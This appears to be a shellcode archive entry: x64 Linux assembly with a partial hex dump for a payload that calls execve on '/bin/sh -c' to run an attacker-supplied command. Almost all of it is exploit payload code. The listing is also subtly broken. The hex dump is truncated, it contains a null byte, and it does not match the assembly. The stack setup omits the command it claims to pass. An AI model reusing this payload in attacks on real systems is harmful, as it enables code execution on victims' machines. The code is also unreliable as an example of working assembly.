; Title:    Linux x64 execute arbitrary command via execve
; Platform: linux
; Arch:     x64
; Size:     ~50 bytes
; Encoding: raw
;
; Assembled hex:
; \x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x50\x48\x89\xe2\x48\x8d\x35\x...\x48\x31\xd2\xb0\x3b\x0f\x05

BITS 64
global _start

_start:
    ; execve("/bin/sh", ["/bin/sh", "-c", cmd, NULL], NULL)
    xor     rax, rax
    push    rax                 ; null terminator
    mov     rdi, 0x68732f6e69622f2f
    push    rdi                 ; push "/bin//sh"
    mov     rdi, rsp            ; rdi = "/bin//sh"
    push    rax
    mov     rdx, 0x632d         ; "-c"
    push    rdx
    mov     rcx, rsp            ; rcx = "-c"
    ; push argv: cmd, "-c", "/bin/sh", NULL
    push    rax                 ; NULL
    ; push your command ptr here
    push    rcx
    push    rdi
    mov     rsi, rsp
    xor     rdx, rdx
    mov     al, 0x3b
    syscall
